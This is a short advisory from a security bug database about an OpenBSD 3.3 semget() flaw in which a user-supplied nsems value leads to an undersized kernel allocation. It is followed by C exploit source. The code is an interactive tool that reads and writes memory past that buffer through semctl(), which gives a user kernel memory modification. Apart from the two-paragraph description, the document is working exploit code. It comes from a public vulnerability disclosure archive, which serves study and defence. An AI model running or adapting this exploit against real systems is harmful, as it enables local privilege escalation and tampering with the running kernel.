source: http://www.securityfocus.com/bid/8464/info
 
A vulnerability has been discovered in the OpenBSD semget() system call. The problem occurs due to insufficient sanity checks before allocating memory using the user-supplied nsems value as an argument. As a result, an attacker may be capable of modifying the running kernel.
 
This vulnerability was introduced in OpenBSD 3.3 and as such, no other versions are affected.

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/param.h>
#include <sys/sysctl.h>

int semid, idx, val;

int read_sem(struct sem *);
void do_read(char *);
void do_write(char *);
void dump_hex(void *, unsigned int);
void dump_sem(struct sem *);

int main(int argc, char *argv[]){
	int quit;
	char buf[80], prev;

	if(argc < 2){
		printf("%s <semid>\n", argv[0]);
		return 1;
	}

	semid = atoi(argv[1]);
	quit = 0;

	while(!quit){
		printf("\n> ");
		fgets(buf, sizeof(buf), stdin);

		switch(buf[0]){
		case 'r':
		case 'R':
			prev = 'r';
			do_read(buf);
			break;

		case 'w':
		case 'W':
			prev = 'w';
			do_write(buf);
			break;

		case 'q':
		case 'Q':
			quit = 1;
			break;

		case 'h':
		case 'H':
			printf("Enter one of the following commands:\n");
			printf("\tr - read a semaphore\n");
			printf("\t\tsyntax r index[.level]\n");
			printf("\t\te.g. r 1\n");
			printf("\t\te.g. r 1.val\n");
			printf("\tw - write a value\n");
			printf("\t\tsyntax w index value\n");
			printf("\t\te.g. w 1 7\n");
			printf("\tq - quit\n");
			break;

		case '\r':
		case '\n':
			if(prev == 'r'){
				sprintf(buf, "r %d\n", ++idx);
				do_read(buf);
			}
			else if(prev == 'w'){
				sprintf(buf, "w %d %d\n", ++idx, val);
				do_write(buf);
			}
			break;
			
		default:
			break;
		}
	}

	return 0;
}

/* Read the contents of a sem structure.
 *
 * idx = index into the array
 * s = buffer to read sem structure into
 */

int read_sem(struct sem *s){
        /*
         * At this point we have forced the kernel to allocate a too-small
         * buffer.  We can read and write members of struct sem's beyond this
         * this buffer using semctl().  A struct sem looks like this:
         *
         * struct sem {
         *      unsigned short  semval;
         *      pid_t           sempid;
         *      unsigned short  semncnt;
         *      unsigned short  semzcnt;
         * };
         */

	memset(s, 0, sizeof(struct sem));

	s->semval = semctl(semid, idx, GETVAL, NULL);
	if(errno != 0)
		goto err;

	s->sempid = semctl(semid, idx, GETPID, NULL);
	if(errno != 0)
		goto err;

	s->semncnt = semctl(semid, idx, GETNCNT, NULL);
	if(errno != 0)
		goto err;

	s->semzcnt = semctl(semid, idx, GETZCNT, NULL);
	if(errno != 0)
		goto err;

	return 0;

err:
	perror("read_sem: semctl");
	return -1;
}

void dump_hex(void *buf, unsigned int size){
	int i, *p;

	p = buf;

	printf("\n");

	for(i = 0; (i * sizeof(int)) < size; i++)
		printf("0x%.08x ", p[i]);
}

void dump_sem(struct sem *s){
	printf("val = %d (%.04x)\n", s->semval, s->semval);
	printf("pid = %d (%.08x)\n", s->sempid, s->sempid);
	printf("ncnt = %d (%.04x)\n", s->semncnt, s->semncnt);
	printf("zcnt = %d (%.04x)\n", s->semzcnt, s->semzcnt);
}

void do_write(char *buf){
	char *p;

	/* write something */
	if((p = strchr(buf, ' ')) == NULL){
		printf("w must take parameters\n");
		return;
	}

	p++;
	idx = atoi(p);

	if((p = strchr(p, ' ')) == NULL){
		printf("w needs a value to write\n");
		return;
	}

	p++;

	if(!strncmp(p, "0x", 2))
		sscanf(p, "0x%x", &val);
	else
		val = atoi(p);
	semctl(semid, idx, SETVAL, val);
}

void do_read(char *buf){
	int ret;
	char *p;
	struct sem sem;

	/* read something */
	if((p = strchr(buf, ' ')) == NULL){
		printf("r must take an index argument\n");
		return;
	}

	p++;
	idx = atoi(p);

	ret = read_sem(&sem);
	if(ret < 0)
		return;

	printf("Index %d:\n", idx);

	if((p = strchr(p, '.')) == NULL){
		dump_sem(&sem);
		dump_hex(&sem, sizeof(sem));
	}
	else{
		p++;
		if(strstr(p, "val"))
			printf("val = %d (%.04x)\n",
				sem.semval, sem.semval);
		if(strstr(p, "pid"))
			printf("pid = %d (%.08x)\n",
				sem.sempid, sem.sempid);
		if(strstr(p, "ncnt"))
			printf("ncnt = %d (%.04x)\n",
				sem.semncnt, sem.semncnt);
		if(strstr(p, "zcnt"))
			printf("zcnt = %d (%.04x)\n",
				sem.semzcnt, sem.semzcnt);
	}
}